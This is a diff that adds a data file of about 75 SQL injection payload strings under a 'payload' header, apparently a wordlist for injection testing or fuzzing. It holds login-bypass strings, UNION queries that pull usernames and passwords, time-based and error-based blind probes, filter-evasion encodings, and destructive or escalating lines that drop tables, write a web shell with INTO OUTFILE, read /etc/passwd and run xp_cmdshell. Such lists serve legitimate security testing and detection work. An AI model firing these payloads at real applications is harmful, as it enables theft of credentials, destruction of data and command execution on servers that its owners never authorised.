@@ -1,0 +1,75 @@
+payload
+' OR 1=1--
+' OR '1'='1
+' OR 1=1#
+' OR 1=1/*
+admin'--
+admin' #
+admin'/*
+' or 1=1 limit 1--
+" OR ""="
+' OR ''='
+' OR 1=1 OR ''='
+1' ORDER BY 1--
+1' ORDER BY 2--
+1' ORDER BY 3--+
+1 UNION SELECT null--
+1 UNION SELECT null,null--
+1 UNION SELECT username, password FROM users--
+' UNION SELECT 1,2,3--
+' UNION ALL SELECT NULL,NULL,NULL--
+-1 UNION SELECT 1,2,3,4,5--
+1' AND 1=1--
+1' AND 1=2--
+1' AND SLEEP(5)--
+1' AND SLEEP(5)#
+' OR SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
+1; WAITFOR DELAY '00:00:05'--
+' OR BENCHMARK(10000000,MD5(1))--
+1' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--
+' AND 1=(SELECT COUNT(*) FROM information_schema.tables)--
+' UNION SELECT table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns--
+' AND extractvalue(1,concat(0x7e,version()))--
+' AND updatexml(1,concat(0x7e,(SELECT user())),1)--
+' OR 1=1 INTO OUTFILE '/var/www/shell.php'--
+' UNION SELECT LOAD_FILE('/etc/passwd')--
+'; DROP TABLE users--
+'; DROP TABLE users;--
+1;DROP TABLE members--
+'; DELETE FROM users WHERE 1=1--
+'; UPDATE users SET password='hacked' WHERE username='admin'--
+' OR EXISTS(SELECT * FROM users)--
+' GROUP BY columnnames HAVING 1=1--
+' HAVING 1=1--
+1' AND 1=1 UNION SELECT 1,@@version--
+' UNION SELECT @@version,@@datadir--
+' AND 1=CAST((SELECT version()) AS INT)--
+1 AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--
+%27%20OR%201%3D1--
+%27%20OR%20%271%27%3D%271
+0x27206f7220313d31
+' OR 'x'='x
+') OR ('1'='1
+')) OR (('1'='1
+' OR 1=1 AND 'a'='a
+admin' AND 1=1--
+admin' OR '1'='1'--
+' UNION SELECT NULL,concat(username,0x3a,password) FROM users--
+1' OR '1'='1' /*
+' OR 1 -- -
+" OR 1 = 1 -- -
+or 1=1--
+1 OR 1=1
+' OR 1=1 LIMIT 1 OFFSET 1--
+'; EXEC xp_cmdshell('dir')--
+'; EXEC master..xp_cmdshell 'net user'--
+' UNION SELECT * FROM sysobjects--
+1' AND substring(version(),1,1)=5--
+' AND ascii(substring((SELECT user()),1,1))>64--
+test' OR sleep(5) AND '1'='1
+' OR/**/1=1--
+'/**/OR/**/1=1#
+uNiOn SeLeCt 1,2,3--
+' Un/**/ion Sel/**/ect 1--
